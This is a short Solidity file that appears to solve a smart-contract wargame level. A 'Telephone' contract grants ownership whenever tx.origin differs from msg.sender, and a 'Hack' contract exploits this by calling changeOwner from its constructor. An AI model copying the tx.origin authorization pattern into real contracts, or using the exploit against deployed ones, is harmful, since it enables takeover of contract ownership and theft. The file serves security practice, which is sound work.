// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {

    constructor(Telephone _target, address _owner) {
        Telephone(_target).changeOwner(_owner);
    }
}

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}